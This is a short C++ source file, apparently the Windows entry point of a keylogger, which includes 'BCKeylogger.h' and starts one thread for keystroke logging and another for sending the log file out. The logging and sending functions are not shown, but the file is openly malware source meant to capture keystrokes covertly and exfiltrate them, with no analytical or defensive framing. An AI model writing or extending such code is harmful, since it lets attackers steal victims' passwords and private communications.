#include <thread>
#include <stdlib.h>
#include "BCKeylogger.h"

using namespace std;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	//keylogger
	userpath();
	thread t1(StartKeyLogging);
	thread t2(sendfileProcess);
	t1.join();
	t2.join();
}